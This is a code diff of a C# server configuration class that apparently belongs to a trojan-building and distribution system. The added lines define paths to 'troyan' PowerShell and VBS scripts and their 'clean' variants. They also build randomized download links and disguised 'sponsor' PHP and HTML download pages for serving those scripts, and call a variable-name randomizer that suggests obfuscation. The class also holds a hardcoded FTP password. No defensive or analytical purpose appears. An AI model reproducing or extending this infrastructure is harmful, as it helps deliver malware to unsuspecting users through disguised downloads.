@@ -1,9 +1,4 @@
-﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel.DataAnnotations;
-using System.IO;
-using System.Text.Json.Serialization;
-using Newtonsoft.Json.Linq;
+﻿using System.Text.Json.Serialization;
 
 namespace model
 {
@@ -19,6 +14,9 @@ namespace model
         
         [JsonPropertyName("bux")]
         public List<BuxModel> Bux { get; set; }
+        
+        [JsonPropertyName("dnSponsor")]
+        public List<DnSponsorModel> DnSponsor { get; set; }
         
         private string _landingName;
         
@@ -49,6 +47,10 @@ namespace model
 
         [JsonPropertyName("cpDir")] public string CpDir => ServerModelLoader.CpDirStatic;
         [JsonPropertyName("certDir")] public string CertDir => ServerModelLoader.CertDirStatic;
+        [JsonPropertyName("phpDir")] public string PhpDir => ServerModelLoader.PhpDirStatic;
+        [JsonPropertyName("phpTemplateFile")] public string PhpTemplateFile => Path.Join(PhpDir, ".\\dn.php");
+        [JsonPropertyName("phpTemplateSponsorFile")] public string PhpTemplateSponsorFile => Path.Join(PhpDir, ".\\download.php");
+        [JsonPropertyName("htmlTemplateSponsorFile")] public string HtmlTemplateSponsorFile => Path.Join(PhpDir, ".\\download.html");
         [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
         [JsonPropertyName("adsDir")] public string AdsDir => ServerModelLoader.AdsDirStatic;
         [JsonPropertyName("publishedAdsDir")] public string PublishedAdsDir => ServerModelLoader.PublishedAdsDirStatic;
@@ -58,6 +60,7 @@ namespace model
         
         [JsonPropertyName("troyanDir")] public string TroyanDir => ServerModelLoader.TroyanDirStatic;
         [JsonPropertyName("troyanScript")] public string TroyanScript => Path.Join(TroyanDir, ".\\_output\\troyan.ps1");
+        [JsonPropertyName("troyanScriptClean")] public string TroyanScriptClean => Path.Join(TroyanDir, ".\\_output\\troyan.c.ps1");
         
         [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
         [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => ServerModelLoader.TroyanDelphiDirStatic;
@@ -85,6 +88,27 @@ namespace model
         
         [JsonPropertyName("userVbsFileClean")] public string UserVbsFileClean => Path.Join(UserDataDir, "troyan.c.vbs");
         [JsonPropertyName("userLiteVbsFileClean")] public string UserLiteVbsFileClean => Path.Join(UserDataDir, "litetroyan.c.vbs");
+        
+        
+        public string Random()
+        {
+            return VbsRandomer.GenerateRandomVariableName(10);
+        }
+        
+        [JsonPropertyName("dnVbsLinkShort")] public string DnVbsLinkShort => $"{Server}/default/{Random()}/none/GetVbs";
+        [JsonPropertyName("dnVbsLink")] public string DnVbsLink => $"http://{Alias}/{DnVbsLinkShort}";
+        [JsonPropertyName("phpVbsLinkShort")] public string PhpVbsLinkShort => $"{Server}/default/GetVbsPhp";
+        
+        [JsonPropertyName("dnLightVbsLinkShort")] public string DnLightVbsLinkShort => $"{Server}/default/{Random()}/none/GetLightVbs";
+        [JsonPropertyName("dnLightVbsLink")] public string DnLightVbsLink => $"http://{Alias}/{DnLightVbsLinkShort}";
+        [JsonPropertyName("phpLightVbsLinkShort")] public string PhpLightVbsLinkShort => $"{Server}/default/GetLightVbsPhp";
+        
+        [JsonPropertyName("userPhpVbsFile")] public string UserPhpVbsFile => Path.Join(UserDataDir, "dn.php");
+        [JsonPropertyName("userSponsorPhpVbsFile")] public string UserSponsorPhpVbsFile => Path.Join(UserDataDir, "download.php");
+        [JsonPropertyName("userSponsorHtmlVbsFile")] public string UserSponsorHtmlVbsFile => Path.Join(UserDataDir, "download.html");
+        [JsonPropertyName("userPhpLightVbsFile")] public string UserPhpLightVbsFile => Path.Join(UserDataDir, "dn_light.php");
+        [JsonPropertyName("userSponsorPhpLightVbsFile")] public string UserSponsorPhpLightVbsFile => Path.Join(UserDataDir, "download_light.php");
+        [JsonPropertyName("userSponsorHtmlLightVbsFile")] public string UserSponsorHtmlLightVbsFile => Path.Join(UserDataDir, "download_light.html");
 
         //FTP
         [JsonPropertyName("ftp")] public string Ftp => $@"ftp://ftpData:Abc12345!@{Server}";
@@ -204,6 +228,7 @@ namespace model
             Embeddings = new List<string>();
             Tabs = new List<TabModel>();
             Bux = new List<BuxModel>();
+            DnSponsor = new List<DnSponsorModel>();
         }
     }
 }
